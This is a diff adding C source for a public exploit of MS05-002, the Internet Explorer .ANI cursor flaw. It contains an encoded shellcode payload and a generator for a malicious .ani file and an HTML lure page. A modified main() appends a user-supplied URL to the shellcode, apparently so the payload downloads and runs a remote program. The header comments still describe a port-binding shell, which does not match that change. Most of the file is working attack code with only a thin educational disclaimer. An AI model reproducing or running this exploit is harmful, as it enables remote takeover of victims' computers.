@@ -1,0 +1,240 @@
+/* Modified by Vertygo aka Ivanm (ivanm@blic.net) all credits goes to
+   houseofdabus  Berend-Jan Wever and to milw0rm*/
+/* Added string.h /str0ke */
+/* HOD-ms05002-ani-expl.c: 2005-01-10: PUBLIC v.0.2
+*
+* Copyright (c) 2004-2005 houseofdabus.
+*
+* (MS05-002) Microsoft Internet Explorer .ANI Files Handling Exploit
+* (CAN-2004-1049)
+*
+*
+*
+*                 .::[ houseofdabus ]::.
+*
+*
+*
+* (universal -- for all affected systems)
+* ---------------------------------------------------------------------
+* Description:
+*    A remote code execution vulnerability exists in the way that
+*    cursor, animated cursor, and icon formats are handled. An attacker
+*    could try to exploit the vulnerability by constructing a malicious
+*    cursor or icon file that could potentially allow remote code
+*    execution if a user visited a malicious Web site or viewed a
+*    malicious e-mail message. An attacker who successfully exploited
+*    this vulnerability could take complete control of an affected
+*    system.
+*
+* ---------------------------------------------------------------------
+* Patch:
+*    http://www.microsoft.com/technet/security/Bulletin/MS05-002.mspx
+*
+* ---------------------------------------------------------------------
+* Tested on:
+*    - Windows Server 2003
+*    - Windows XP SP1
+*    - Windows XP SP0
+*    - Windows 2000 SP4
+*    - Windows 2000 SP3
+*    - Windows 2000 SP2
+*
+* ---------------------------------------------------------------------
+* Compile:
+*
+* Win32/VC++  : cl -o HOD-ms05002-ani-expl HOD-ms05002-ani-expl.c
+* Win32/cygwin: gcc -o HOD-ms05002-ani-expl HOD-ms05002-ani-expl.c
+* Linux       : gcc -o HOD-ms05002-ani-expl HOD-ms05002-ani-expl.c
+*
+* ---------------------------------------------------------------------
+* Example:
+*
+* C:\>HOD-ms05002-ani-expl.exe poc 7777
+* <...>
+* [*] Creating poc.ani file ... Ok
+* [*] Creating poc.html file ... Ok
+*
+* C:\>
+*
+* start IE -> C:\poc.html
+*
+* C:\>telnet localhost 7777
+* Microsoft Windows 2000 [Version 5.00.2195]
+* (C) Copyright 1985-2000 Microsoft Corp.
+*
+* C:\Documents and Settings\Administrator\Desktop>
+*
+* ---------------------------------------------------------------------
+*
+*   This is provided as proof-of-concept code only for educational
+*   purposes and testing by authorized individuals with permission to
+*   do so.
+*
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+/* ANI header */
+unsigned char aniheader[] =
+"\x52\x49\x46\x46\x9c\x18\x00\x00\x41\x43\x4f\x4e\x61\x6e\x69\x68"
+"\x7c\x03\x00\x00\x24\x00\x00\x00\x08\x00\x00\x00\x08\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+
+/* jmp offset, no Jitsu */
+"\x77\x82\x40\x00\xeb\x64\x90\x90\x77\x82\x40\x00\xeb\x64\x90\x90"
+"\xeb\x54\x90\x90\x77\x82\x40\x00\xeb\x54\x90\x90\x77\x82\x40\x00"
+"\xeb\x44\x90\x90\x77\x82\x40\x00\xeb\x44\x90\x90\x77\x82\x40\x00"
+"\xeb\x34\x90\x90\x77\x82\x40\x00\xeb\x34\x90\x90\x77\x82\x40\x00"
+"\xeb\x24\x90\x90\x77\x82\x40\x00\xeb\x24\x90\x90\x77\x82\x40\x00"
+"\xeb\x14\x90\x90\x77\x82\x40\x00\xeb\x14\x90\x90\x77\x82\x40\x00"
+"\x77\x82\x40\x00\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
+
+/* portbind shellcode */
+unsigned char shellcode[] =
+"\xEB\x0F\x58\x80\x30\x17\x40\x81\x38\x6D\x30\x30\x21\x75\xF4"
+"\xEB\x05\xE8\xEC\xFF\xFF\xFF\xFE\x94\x16\x17\x17\x4A\x42\x26"
+"\xCC\x73\x9C\x14\x57\x84\x9C\x54\xE8\x57\x62\xEE\x9C\x44\x14"
+"\x71\x26\xC5\x71\xAF\x17\x07\x71\x96\x2D\x5A\x4D\x63\x10\x3E"
+"\xD5\xFE\xE5\xE8\xE8\xE8\x9E\xC4\x9C\x6D\x2B\x16\xC0\x14\x48"
+"\x6F\x9C\x5C\x0F\x9C\x64\x37\x9C\x6C\x33\x16\xC1\x16\xC0\xEB"
+"\xBA\x16\xC7\x81\x90\xEA\x46\x26\xDE\x97\xD6\x18\xE4\xB1\x65"
+"\x1D\x81\x4E\x90\xEA\x63\x05\x50\x50\xF5\xF1\xA9\x18\x17\x17"
+"\x17\x3E\xD9\x3E\xE0\xFE\xFF\xE8\xE8\xE8\x26\xD7\x71\x9C\x10"
+"\xD6\xF7\x15\x9C\x64\x0B\x16\xC1\x16\xD1\xBA\x16\xC7\x9E\xD1"
+"\x9E\xC0\x4A\x9A\x92\xB7\x17\x17\x17\x57\x97\x2F\x16\x62\xED"
+"\xD1\x17\x17\x9A\x92\x0B\x17\x17\x17\x47\x40\xE8\xC1\x7F\x13"
+"\x17\x17\x17\x7F\x17\x07\x17\x17\x7F\x68\x81\x8F\x17\x7F\x17"
+"\x17\x17\x17\xE8\xC7\x9E\x92\x9A\x17\x17\x17\x9A\x92\x18\x17"
+"\x17\x17\x47\x40\xE8\xC1\x40\x9A\x9A\x42\x17\x17\x17\x46\xE8"
+"\xC7\x9E\xD0\x9A\x92\x4A\x17\x17\x17\x47\x40\xE8\xC1\x26\xDE"
+"\x46\x46\x46\x46\x46\xE8\xC7\x9E\xD4\x9A\x92\x7C\x17\x17\x17"
+"\x47\x40\xE8\xC1\x26\xDE\x46\x46\x46\x46\x9A\x82\xB6\x17\x17"
+"\x17\x45\x44\xE8\xC7\x9E\xD4\x9A\x92\x6B\x17\x17\x17\x47\x40"
+"\xE8\xC1\x9A\x9A\x86\x17\x17\x17\x46\x7F\x68\x81\x8F\x17\xE8"
+"\xA2\x9A\x17\x17\x17\x44\xE8\xC7\x48\x9A\x92\x3E\x17\x17\x17"
+"\x47\x40\xE8\xC1\x7F\x17\x17\x17\x17\x9A\x8A\x82\x17\x17\x17"
+"\x44\xE8\xC7\x9E\xD4\x9A\x92\x26\x17\x17\x17\x47\x40\xE8\xC1"
+"\xE8\xA2\x86\x17\x17\x17\xE8\xA2\x9A\x17\x17\x17\x44\xE8\xC7"
+"\x9A\x92\x2E\x17\x17\x17\x47\x40\xE8\xC1\x44\xE8\xC7\x9A\x92"
+"\x56\x17\x17\x17\x47\x40\xE8\xC1\x7F\x12\x17\x17\x17\x9A\x9A"
+"\x82\x17\x17\x17\x46\xE8\xC7\x9A\x92\x5E\x17\x17\x17\x47\x40"
+"\xE8\xC1\x7F\x17\x17\x17\x17\xE8\xC7\xFF\x6F\xE9\xE8\xE8\x50"
+"\x72\x63\x47\x65\x78\x74\x56\x73\x73\x65\x72\x64\x64\x17\x5B"
+"\x78\x76\x73\x5B\x7E\x75\x65\x76\x65\x6E\x56\x17\x41\x7E\x65"
+"\x63\x62\x76\x7B\x56\x7B\x7B\x78\x74\x17\x48\x7B\x74\x65\x72"
+"\x76\x63\x17\x48\x7B\x60\x65\x7E\x63\x72\x17\x48\x7B\x74\x7B"
+"\x78\x64\x72\x17\x40\x7E\x79\x52\x6F\x72\x74\x17\x52\x6F\x7E"
+"\x63\x47\x65\x78\x74\x72\x64\x64\x17\x40\x7E\x79\x5E\x79\x72"
+"\x63\x17\x5E\x79\x63\x72\x65\x79\x72\x63\x58\x67\x72\x79\x56"
+"\x17\x5E\x79\x63\x72\x65\x79\x72\x63\x58\x67\x72\x79\x42\x65"
+"\x7B\x56\x17\x5E\x79\x63\x72\x65\x79\x72\x63\x45\x72\x76\x73"
+"\x51\x7E\x7B\x72\x17\x17\x17\x17\x17\x17\x17\x17\x17\x7A\x27"
+"\x27\x39\x72\x6F\x72\x17"
+"m00!";
+
+//#define SET_PORTBIND_PORT(buf, port)  *(unsigned short *)(((buf)+300)) = (port)
+
+unsigned char discl[] =
+"This is provided as proof-of-concept code only for educational"
+" purposes and testing by authorized individuals with permission"
+" to do so.";
+
+unsigned char html[] =
+"<html>\n"
+"(MS05-002) Microsoft Internet Explorer .ANI Files Handling Exploit"
+"<br>Copyright (c) 2004-2005 .: houseofdabus :.<br><a href =\""
+"http://www.microsoft.com/technet/security/Bulletin/MS05-002.mspx\">"
+"Patch (MS05-002)</a>\n"
+"<script>alert(\"%s\")</script>\n<head>\n\t<style>\n"
+"\t\t* {CURSOR: url(\"%s.ani\")}\n\t</style>\n</head>\n"
+"</html>";
+
+unsigned short
+fixx(unsigned short p)
+{
+       unsigned short r = 0;
+       r  = (p & 0xFF00) >> 8;
+       r |= (p & 0x00FF) << 8;
+
+return r;
+}
+
+void
+usage(char *prog)
+{
+       printf("Usage:\n");
+       printf("%s <file> <url to file>\n\n", prog);
+       printf("eg: %s index http://www.blic.net/proggy.exe\n\n", prog);
+       exit(0);
+}
+
+int
+main(int argc, char **argv)
+{
+       FILE *fp;
+       unsigned short port;
+       unsigned char f[256+5] = "";
+       unsigned char anib[912] = "";
+
+       unsigned char newshellcode[686];
+
+       printf("\n(MS05-002) Microsoft Internet Explorer .ANI Files Handling Exploit\n\n");
+       printf("\tCopyright (c) 2004-2005 .: houseofdabus :.\n\n\n");
+       printf("\tModified by Vertygo (ivanm@blic.net)\n\n\n");
+
+       printf("%s\n\n", discl);
+       if ( (sizeof(shellcode)-1) > (912-sizeof(aniheader)-3) ) {
+               printf("[-] Size of shellcode must be <= 686 bytes\n");
+               return 0;
+       }
+       if (argc < 3) usage(argv[0]);
+
+       if (strlen(argv[1]) > 256) {
+               printf("[-] Size of filename must be <=256 bytes\n");
+               return 0;
+       }
+
+       /* creating ani file */
+       strcpy(f, argv[1]);
+       strcat(f, ".ani");
+       printf("[*] Creating %s file ...", f);
+       fp = fopen(f, "wb");
+       if (fp == NULL) {
+               printf("\n[-] error: can\'t create file: %s\n", f);
+               return 0;
+       }
+
+       memset(newshellcode,0x90,sizeof(shellcode)+strlen(argv[2])+1);
+            strcpy(newshellcode,shellcode);
+        strcat(newshellcode,argv[2]);
+        strcat(newshellcode,"\x01");
+       memset(anib, 0x90, 912);
+       memcpy(anib, aniheader, sizeof(aniheader)-1);
+       memcpy(anib+sizeof(aniheader)-1, newshellcode, sizeof(newshellcode)-1);
+       fwrite(anib, 1, 912, fp);
+       printf(" Ok\n");
+       fclose(fp);
+       f[0] = '\0';
+       strcpy(f, argv[1]);
+       strcat(f, ".html");
+       printf("[*] Creating %s file ...", f);
+       fp = fopen(f, "wb");
+       if (fp == NULL) {
+               printf("\n[-] error: can\'t create file: %s\n", f);
+               return 0;
+       }
+       sprintf(anib, html, discl, argv[1]);
+       fwrite(anib, 1, strlen(anib), fp);
+       printf(" Ok\n");
+       fclose(fp);
+
+return 0;
+}
+
+// milw0rm.com [2005-01-24]
